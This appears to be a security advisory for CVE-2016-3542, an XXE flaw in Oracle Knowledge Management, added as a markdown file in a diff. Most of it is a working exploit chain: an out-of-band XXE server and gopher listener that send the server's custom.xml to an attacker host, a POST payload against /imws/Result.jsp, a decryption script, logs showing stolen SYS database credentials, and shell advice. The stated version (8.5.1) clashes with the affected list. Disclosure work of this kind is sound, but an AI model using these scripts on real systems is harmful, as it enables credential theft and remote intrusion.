@@ -1,0 +1,227 @@
+# SSD Advisory – Oracle Knowledge Management XXE Leading to a RCE
+
+## Vulnerability Summary
+The following advisory describe Information Disclosure found in Oracle Knowledge Management version 8.5.1.
+
+By enabling searches across a wide variety of sources, Oracle's InQuira knowledge management products offer simple and convenient ways for users to access knowledge that was once hidden in the myriad systems, applications, and databases used to store enterprise content.
+
+Oracle's products for knowledge management help users find useful knowledge contained in corporate information stores.
+
+## Credit
+An independent security researcher, Steven Seeley, has reported this vulnerability to Beyond Security's SecuriTeam Secure Disclosure program.
+
+## Vendor response
+Oracle has released patches to address this vulnerability, for more details see: http://www.oracle.com/technetwork/security-advisory/cpujul2016-2881720.html.
+
+## Vulnerability Details
+The vulnerable code can be found in /imws/Result.jsp which when calls, can be used to access an XML from a third-party server, this third-party server which can be under our control can be used to reference files locally present on the victim's server.
+
+## Proof of Concept
+To exploit the vulnerability, we will run the following 5 steps (the first 2 need to be run in the background):
+
+- 'Malicious' XML External Entity (XXE) server
+- Listener for the gopher protocol
+- Attacker who steal the 'custom.xml' file
+- Decrypt/crack the encrypted AES password
+- Shell on the machine
+- This image illustrates the steps this attack requires and the sequence of events that happen (behind the scenes):
+
+
+## Step 1 – setup a 'malicious' XML External Entity (XXE) server:
+
+```
+x@pluto:~/xxe$ ruby xxeserve.rb -o 0.0.0.0
+[2015-02-09 16:03:45] INFO  WEBrick 1.3.1
+[2015-02-09 16:03:45] INFO  ruby 1.9.3 (2013-11-22) [x86_64-linux]
+== Sinatra/1.4.5 has taken the stage on 4567 for development with backup from WEBrick
+[2015-02-09 16:03:45] INFO  WEBrick::HTTPServer#start: pid=18862 port=4567
+172.16.77.128 - - [09/Feb/2015:16:04:10 +1100] "GET /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml HTTP/1.1" 200 173 0.0089
+172.16.77.128 - - [09/Feb/2015:16:04:10 AEDT] "GET /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml HTTP/1.1" 200 173
+- -> /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml
+```
+
+## Step 2 – setup a listener for the gopher protocol:
+
+```
+x@pluto:~/xxe$ ./gopher.py
+starting up on 0.0.0.0 port 1337
+waiting for a connection
+connection from ('172.16.77.128', 50746)
+(+) The database SID is: jdbc:oracle:thin:@WIN-U94QE7O15KE:1521:IM
+(+) The database username is: SYS as SYSDBA
+(+) The database password is: VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4=
+```
+
+## Step 3 – steal the 'custom.xml' file
+
+
+```
+x@pluto:~/xxe$ ./poc.py 
+(+) pulling custom.xml for the db password...
+(!) Success! please check the gopher.py window!
+```
+
+## Step 4 – decrypt/crack the encrypted AES password:
+
+```
+NOTE: you will need to bruteforce the encryption key which is contained in the wallet.
+Oracle Knowledge uses 'OracleKnowledge1' as the wallet/keystore password, but you will most likely not have the wallet or keystore in which case a dictionary attack is to be used to find the password.
+
+x@pluto:~/xxe$ ./decrypt.sh VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4=
+(+) Decrypting... "VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4="
+Result: "password"
+```
+
+## Step 5 – get a shell
+
+Using the database information, login to the database remotely and execute code. You may also find another configuration file on the system that will allow you a more 'direct' way to obtain a SYSTEM shell.
+
+### xxeserve.rb
+
+```
+#!/usr/bin/env ruby
+# Notes:
+# - This is the out of band xxe server that is used to retrieve the file and send it via the gopher protocol
+# - ruby xxeserve.rb -o 0.0.0.0
+
+require 'sinatra'
+
+get "/" do
+  return "OHAI" if params[:p].nil?
+  f = File.open("./files/#{request.ip}#{Time.now.to_i}","w")
+  f.write(params[:p])
+  f.close
+  ""
+end
+
+get "/xml" do
+  return "" if params[:f].nil?
+
+<<END  
+<!ENTITY % payl SYSTEM "file:///#{params[:f]}">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'gopher://#{request.host}:1337/?%payl;'>">
+END
+end
+```
+
+### gopher.py
+
+```
+#!/usr/bin/python
+# Notes:
+# - This code just listens for client requests on port 1337
+# - it looks for database strings and prints them out
+
+import socket
+import sys
+import re
+
+# Create a TCP/IP socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Bind the socket to the port
+server_address = ('0.0.0.0', 1337)
+print >>sys.stderr, 'starting up on %s port %s' % server_address
+
+
+sock.bind(server_address)
+	
+# Listen for incoming connections
+sock.listen(1)
+
+while True:
+    # Wait for a connection
+    print >>sys.stderr, 'waiting for a connection'
+    connection, client_address = sock.accept()
+    try:
+        print >>sys.stderr, 'connection from', client_address
+
+        # Receive the data in small chunks and retransmit it
+        while True:
+            data = connection.recv(2048)
+            
+            if data:
+				#print data
+				matchuser = re.search("<user>(.*)</user>", data)
+				matchpassword = re.search("<password>(.*)</password>", data)
+				matchurl = re.search("<url>(.*)</url>", data)
+				if matchuser and matchpassword and matchurl:
+					print "(+) The database SID is: %s" % matchurl.group(1)
+					print "(+) The database username is: %s" % matchuser.group(1)
+					print "(+) The database password is: %s" % matchpassword.group(1)
+					connection.close()
+					sys.exit(1)
+				connection.close()
+				sys.exit(1)
+            else:
+                print >>sys.stderr, 'no more data from', client_address
+                break
+            
+    except Exception:
+	    connection.close()
+		
+    finally:
+        # Clean up the connection
+        connection.close()
+```
+
+### poc.py
+
+```
+#!/usr/bin/python
+# Notes:
+# - This code steals the C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml file via the XXE bug.
+# - You need to run ruby xxeserve.rb -o 0.0.0.0 and use an interface ip for the "local xxe server"
+# - The code requires a proxy server to be setup on 127.0.0.1:8080 although, this can be changed
+
+import requests
+import json
+import sys
+
+# burp, ftw
+proxies = {
+  "http": "http://127.0.0.1:8080",
+}
+
+if len(sys.argv) < 3:
+	print "(+) Usage: %s [local xxe server:port] [target]" % sys.argv[0]
+	print "(+) Example: %s 172.16.77.1:4567 172.16.77.128" % sys.argv[0]
+	sys.exit(1)
+	
+localxxeserver = sys.argv[1]
+target = sys.argv[2]
+
+payload = {'method' : '2', 'inputXml': '''<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY %% remote SYSTEM "http://%s/xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml">
+%%remote;
+%%int;
+%%trick;]>''' % localxxeserver}
+
+url = 'http://%s:8226/imws/Result.jsp' % target
+
+headers = {'content-type': 'application/x-www-form-urlencoded'}
+print "(+) pulling custom.xml for the db password..."
+r = requests.post(url, data=payload, headers=headers, proxies=proxies)
+if r.status_code == 200:
+	print "(!) Success! please check the gopher.py window!"
+```
+
+### decrypt.sh
+
+```
+#!/bin/sh
+if [ "$#" -ne 1 ]; then
+    echo "(!) Usage: $0 [hash]"
+else
+    java -classpath "infra_encryption.jar:oraclepki.jar:osdt_core.jar:osdt_cert.jar:commons-codec-1.3.jar" -DKEYSTORE_LOCATION="keystore" com.inquira.infra.security.OKResourceEncryption $1
+fi
+```
+
+
+## CVE Details
+
+CVE-2016-3542
+
+## Affected Products
+Oracle Knowledge Management versions 12.1.1, 12.1.2, 12.1.3, 12.2.3, 12.2.4, and 12.2.5.
